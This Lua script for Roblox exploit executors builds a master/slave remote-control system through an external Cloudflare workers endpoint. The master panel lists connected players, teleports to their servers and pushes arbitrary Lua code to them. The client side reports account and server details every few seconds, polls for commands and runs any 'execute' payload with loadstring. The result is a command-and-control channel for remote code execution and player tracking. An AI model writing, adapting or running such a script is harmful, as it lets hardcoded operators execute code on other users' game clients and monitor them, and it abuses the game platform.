local CF_URL = "https://control.huynesoi270111.workers.dev"
local req = (syn and syn.request) or (http and http.request) or http_request or request
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LP = Players.LocalPlayer
local TeleportService = game:GetService("TeleportService")

local MASTERS = {["huynesoi"] = true, ["soicon19911"] = true}
local isMaster = MASTERS[LP.Name] or false

local selectedLead = nil
local selectedFollowers = {}
local currentViewing = nil

local function Post(path, data)
    local suc, res = pcall(function()
        return req({
            Url = CF_URL .. path,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)
    if suc and res and res.Body then
        local s, d = pcall(function() return HttpService:JSONDecode(res.Body) end)
        if s then return d end
    end
    return nil
end

if isMaster then
    local sg = Instance.new("ScreenGui", game:GetService("CoreGui"))
    local main = Instance.new("Frame", sg)
    main.Size = UDim2.new(0, 650, 0, 450)
    main.Position = UDim2.new(0.5, -325, 0.5, -225)
    main.BackgroundColor3 = Color3.fromHex("#1E1F22")
    main.Active = true
    main.Draggable = true
    Instance.new("UICorner", main).CornerRadius = UDim.new(0, 8)

    local leftPanel = Instance.new("Frame", main)
    leftPanel.Size = UDim2.new(0.35, 0, 1, -120)
    leftPanel.Position = UDim2.new(0, 10, 0, 10)
    leftPanel.BackgroundColor3 = Color3.fromHex("#2B2D31")
    Instance.new("UICorner", leftPanel)

    local scroll = Instance.new("ScrollingFrame", leftPanel)
    scroll.Size = UDim2.new(1, -10, 1, -10)
    scroll.Position = UDim2.new(0, 5, 0, 5)
    scroll.BackgroundTransparency = 1
    scroll.BorderSizePixel = 0
    Instance.new("UIListLayout", scroll).Padding = UDim.new(0, 5)

    local rightPanel = Instance.new("Frame", main)
    rightPanel.Size = UDim2.new(0.65, -30, 1, -120)
    rightPanel.Position = UDim2.new(0.35, 20, 0, 10)
    rightPanel.BackgroundColor3 = Color3.fromHex("#2B2D31")
    Instance.new("UICorner", rightPanel)

    local avatarImg = Instance.new("ImageLabel", rightPanel)
    avatarImg.Size = UDim2.new(0, 100, 0, 100)
    avatarImg.Position = UDim2.new(0, 15, 0, 15)
    avatarImg.BackgroundColor3 = Color3.fromHex("#1E1F22")
    Instance.new("UICorner", avatarImg)

    local dInfo = Instance.new("TextLabel", rightPanel)
    dInfo.Size = UDim2.new(1, -140, 0, 100)
    dInfo.Position = UDim2.new(0, 130, 0, 15)
    dInfo.BackgroundTransparency = 1
    dInfo.TextColor3 = Color3.new(1,1,1)
    dInfo.TextXAlignment = Enum.TextXAlignment.Left
    dInfo.TextYAlignment = Enum.TextYAlignment.Top
    dInfo.TextSize = 14

    local dJoin = Instance.new("TextButton", rightPanel)
    dJoin.Size = UDim2.new(0.9, 0, 0, 35)
    dJoin.Position = UDim2.new(0.05, 0, 0, 135)
    dJoin.BackgroundColor3 = Color3.fromRGB(80,80,80)
    dJoin.TextColor3 = Color3.new(1,1,1)
    dJoin.Text = "JOIN SERVER"
    Instance.new("UICorner", dJoin)

    local dControl = Instance.new("TextButton", rightPanel)
    dControl.Size = UDim2.new(0.42, 0, 0, 45)
    dControl.Position = UDim2.new(0.05, 0, 0, 185)
    dControl.BackgroundColor3 = Color3.fromRGB(255,255,0)
    dControl.TextColor3 = Color3.new(0,0,0)
    dControl.Text = "SET LEAD"
    dControl.Font = Enum.Font.GothamBold
    Instance.new("UICorner", dControl)

    local dSync = Instance.new("TextButton", rightPanel)
    dSync.Size = UDim2.new(0.42, 0, 0, 45)
    dSync.Position = UDim2.new(0.53, 0, 0, 185)
    dSync.BackgroundColor3 = Color3.fromRGB(0,255,0)
    dSync.TextColor3 = Color3.new(0,0,0)
    dSync.Text = "ADD FOLLOWER"
    dSync.Font = Enum.Font.GothamBold
    Instance.new("UICorner", dSync)

    local bottomPanel = Instance.new("Frame", main)
    bottomPanel.Size = UDim2.new(1, -20, 0, 90)
    bottomPanel.Position = UDim2.new(0, 10, 1, -100)
    bottomPanel.BackgroundColor3 = Color3.fromHex("#2B2D31")
    Instance.new("UICorner", bottomPanel)

    local eInput = Instance.new("TextBox", bottomPanel)
    eInput.Size = UDim2.new(0.7, -10, 0, 40)
    eInput.Position = UDim2.new(0, 10, 0, 10)
    eInput.BackgroundColor3 = Color3.fromHex("#1E1F22")
    eInput.TextColor3 = Color3.new(1,1,1)
    eInput.TextXAlignment = Enum.TextXAlignment.Left
    eInput.Text = ""
    eInput.PlaceholderText = " Script Executor..."
    Instance.new("UICorner", eInput)

    local eRun = Instance.new("TextButton", bottomPanel)
    eRun.Size = UDim2.new(0.3, -10, 0, 40)
    eRun.Position = UDim2.new(0.7, 0, 0, 10)
    eRun.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
    eRun.TextColor3 = Color3.new(1,1,1)
    eRun.Text = "EXECUTE"
    eRun.Font = Enum.Font.GothamBold
    Instance.new("UICorner", eRun)

    local syncEnterBtn = Instance.new("TextButton", bottomPanel)
    syncEnterBtn.Size = UDim2.new(0.48, 0, 0, 30)
    syncEnterBtn.Position = UDim2.new(0, 10, 0, 55)
    syncEnterBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
    syncEnterBtn.TextColor3 = Color3.new(1,1,1)
    syncEnterBtn.Text = "SYNC ENTER"
    syncEnterBtn.Font = Enum.Font.GothamBold
    Instance.new("UICorner", syncEnterBtn)

    local cancelBtn = Instance.new("TextButton", bottomPanel)
    cancelBtn.Size = UDim2.new(0.48, 0, 0, 30)
    cancelBtn.Position = UDim2.new(0.5, 0, 0, 55)
    cancelBtn.BackgroundColor3 = Color3.fromRGB(240, 71, 71)
    cancelBtn.TextColor3 = Color3.new(1,1,1)
    cancelBtn.Text = "CANCEL ALL"
    cancelBtn.Font = Enum.Font.GothamBold
    Instance.new("UICorner", cancelBtn)

    local function updateList()
        local users = Post("/list", {})
        if not users then return end
        
        for _, v in pairs(scroll:GetChildren()) do if v:IsA("TextButton") then v:Destroy() end end
        
        for _, u in ipairs(users) do
            local b = Instance.new("TextButton", scroll)
            b.Size = UDim2.new(1, 0, 0, 40)
            b.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
            b.TextColor3 = Color3.new(1,1,1)
            b.Text = u.name
            Instance.new("UICorner", b)

            if selectedLead == u.name then
                b.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
                b.TextColor3 = Color3.new(0,0,0)
            elseif selectedFollowers[u.name] then
                b.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
                b.TextColor3 = Color3.new(0,0,0)
            end

            b.MouseButton1Click:Connect(function()
                currentViewing = u
                local s, img = pcall(function() return Players:GetUserThumbnailAsync(u.id, Enum.ThumbnailType.HeadShot, Enum.ThumbnailResolution.Size420x420) end)
                if s then avatarImg.Image = img end
                dInfo.Text = string.format(" Tên: %s\n ID: %d\n Game ID: %d\n Uptime: %ds", u.name, u.id, u.placeId, u.uptime)
            end)
        end
    end

    dJoin.MouseButton1Click:Connect(function()
        if currentViewing then TeleportService:TeleportToPlaceInstance(currentViewing.placeId, currentViewing.jobId, LP) end
    end)

    dControl.MouseButton1Click:Connect(function()
        if currentViewing then
            selectedLead = currentViewing.name
            updateList()
        end
    end)

    dSync.MouseButton1Click:Connect(function()
        if currentViewing then
            selectedFollowers[currentViewing.name] = true
            updateList()
        end
    end)

    syncEnterBtn.MouseButton1Click:Connect(function()
        if selectedLead then
            for fName, _ in pairs(selectedFollowers) do
                Post("/send_cmd", {target = fName, type = "sync_to", data = selectedLead})
            end
        end
    end)

    cancelBtn.MouseButton1Click:Connect(function()
        for fName, _ in pairs(selectedFollowers) do Post("/send_cmd", {target = fName, type = "stop_sync", data = ""}) end
        if selectedLead then Post("/send_cmd", {target = selectedLead, type = "stop_sync", data = ""}) end
        selectedLead = nil
        selectedFollowers = {}
        updateList()
    end)

    eRun.MouseButton1Click:Connect(function()
        local code = eInput.Text
        if code == "" then return end
        if selectedLead then Post("/send_cmd", {target = selectedLead, type = "execute", data = code}) end
        for fName, _ in pairs(selectedFollowers) do Post("/send_cmd", {target = fName, type = "execute", data = code}) end
    end)

    task.spawn(function()
        while task.wait(3) do updateList() end
    end)

else
    local slaveGui = Instance.new("ScreenGui", game:GetService("CoreGui"))
    local sFrame = Instance.new("Frame", slaveGui)
    sFrame.Size = UDim2.new(0, 200, 0, 80)
    sFrame.Position = UDim2.new(0.5, -100, 0.5, -40)
    sFrame.BackgroundColor3 = Color3.fromHex("#1E1F22")
    sFrame.Active = true
    sFrame.Draggable = true
    Instance.new("UICorner", sFrame).CornerRadius = UDim.new(0, 8)

    local sBtn = Instance.new("TextButton", sFrame)
    sBtn.Size = UDim2.new(1, -20, 1, -20)
    sBtn.Position = UDim2.new(0, 10, 0, 10)
    sBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
    sBtn.TextColor3 = Color3.new(1,1,1)
    sBtn.Font = Enum.Font.GothamBold
    sBtn.TextSize = 14
    sBtn.Text = "SEND INFO TO MASTER"
    Instance.new("UICorner", sBtn)

    sBtn.MouseButton1Click:Connect(function()
        slaveGui:Destroy()
        
        task.spawn(function()
            local startTime = os.time()
            while task.wait(3) do
                Post("/update", {id = LP.UserId, name = LP.Name, jobId = game.JobId, placeId = game.PlaceId, uptime = os.time() - startTime})
            end
        end)

        local activeTarget = nil

        task.spawn(function()
            while task.wait(1) do
                local cmd = Post("/get_cmd", {name = LP.Name})
                if cmd then
                    if cmd.type == "sync_to" then
                        activeTarget = cmd.data
                    elseif cmd.type == "stop_sync" then
                        activeTarget = nil
                    elseif cmd.type == "execute" then
                        local f = loadstring(cmd.data)
                        if f then task.spawn(f) end
                    end
                end
            end
        end)

        task.spawn(function()
            while task.wait(0.1) do
                if activeTarget then
                    local tPlayer = Players:FindFirstChild(activeTarget)
                    if tPlayer and tPlayer.Character and tPlayer.Character:FindFirstChild("HumanoidRootPart") then
                        if LP.Character and LP.Character:FindFirstChild("Humanoid") then
                            local pos = tPlayer.Character.HumanoidRootPart.Position
                            local targetVec = Vector3.new(pos.X, pos.Y, pos.Z)
                            LP.Character.Humanoid:MoveTo(targetVec)
                        end
                    end
                end
            end
        end)
    end)
end
